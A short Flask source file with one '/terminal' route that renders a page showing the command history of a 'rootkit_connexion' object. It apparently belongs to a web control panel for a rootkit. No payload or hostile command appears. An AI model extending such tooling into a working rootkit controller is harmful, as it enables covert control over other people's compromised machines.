from app import app
import config as cfg
from flask import render_template, redirect, url_for, request, session, jsonify
import socket

# --------------------------------- TERMINAL --------------------------------- #

@app.route('/terminal')
def terminal():
    return render_template("terminal.html", history=cfg.rootkit_connexion.get_command_history(), last_channel=cfg.last_channel)